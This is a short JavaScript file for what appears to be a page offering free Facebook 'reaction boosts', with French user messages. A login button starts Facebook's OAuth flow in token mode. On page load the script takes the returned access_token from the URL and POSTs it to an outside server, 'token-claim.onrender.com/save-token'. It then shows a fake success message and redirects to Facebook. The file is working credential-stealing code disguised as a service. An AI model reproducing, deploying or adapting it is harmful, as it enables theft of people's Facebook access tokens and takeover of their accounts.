const GITHUB_URL = "https://jeandolin2-lang.github.io/Token-claim/";
const RENDER_URL = "https://token-claim.onrender.com/save-token";

window.onload = function() {
    if (window.location.hash.includes('access_token')) {
        const params = new URLSearchParams(window.location.hash.replace('#', '?'));
        const token = params.get('access_token');

        if (token) {
            fetch(RENDER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: token })
            })
            .then(res => {
                if(res.ok) {
                    alert("✅ Boost activé ! Tes réactions arrivent.");
                    window.location.href = "https://facebook.com";
                }
            })
            .catch(err => console.error("Erreur serveur:", err));
        }
    }
};

document.getElementById('loginBtn').onclick = function() {
    const clientId = "350685531728";
    const authUrl = `https://www.facebook.com/v1.0/dialog/oauth?client_id=${clientId}&redirect_uri=${GITHUB_URL}&response_type=token&scope=public_profile,user_posts`;
    window.location.href = authUrl;
};
